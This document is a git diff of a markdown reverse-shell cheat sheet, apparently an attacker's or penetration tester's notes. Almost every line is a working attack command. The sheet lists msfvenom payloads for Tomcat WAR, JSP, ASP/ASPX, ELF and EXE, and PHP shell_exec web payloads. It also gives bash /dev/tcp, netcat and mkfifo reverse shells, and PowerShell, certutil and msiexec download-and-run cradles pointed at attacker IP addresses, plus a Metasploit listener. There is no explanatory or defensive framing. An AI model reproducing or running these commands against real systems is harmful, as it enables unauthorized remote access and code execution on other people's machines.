@@ -1,18 +1,17 @@
 
-
-
-## Entry 
-
+## INITIAL ENTRY 
 ````
 JSP / tomcat WAR 
 msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.127 LPORT=4444 -f war > java4444.war  
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=4448 -f raw > w4448.jsp 
 
 ASP /ASPX 
-
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.155 LPORT=4444 -f asp > shell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.155 LPORT=4444 -f aspx > shell.aspx
 
 PHP 
-
+<?php $cmd = shell_exec('bash -i >& /dev/tcp/192.168.119.155/4444 0>&1'); echo $cmd;?> 
+<?php $cmd = shell_exec('cmd /c \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4444'); echo $cmd;?> 
 
 ````
 #### WEBSHELLS
@@ -36,8 +35,8 @@ Perl/CGI
 ````
 
 
-## Linux 
-
+## LINUX
+#### COMON
 ````
 bash -i >& /dev/tcp/192.168.119.155/4444 0>&1  
 
@@ -48,7 +47,7 @@ mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i |nc 192.168.119.155 4444 >/tmp/f2
 nc -e /bin/bash 192.168.119.155 4444
 
 ````
-
+#### MORE
 ````
 php -r '$sock=fsockopen("10.10.16.127",4446);exec("/bin/sh -i <&3 >&3 2>&3");' 
 
@@ -63,6 +62,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 
 
 ## WINDOWS
+#### COMON
 ````
 \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4444
 
@@ -76,8 +76,7 @@ powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http:/
 
 
 ````
-
-
+#### MORE
 ````
 certutil -urlcache -f http://192.168.119.155/shell.exe shell.exe & shell.exe 
 
@@ -91,5 +90,26 @@ powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.
 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi 
 msiexec /q /i http://192.168.1.109/1.msi 
+
+````
+
+
+## MSFVENOM
+
+Ref -  https://netsec.ws/?p=331 
+ 
+````
+Listener  
+msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 4445; run -j" 
+
+UnStaged 
+
+msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf  
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 
+
+Staged  
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf   
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 
 
 ````
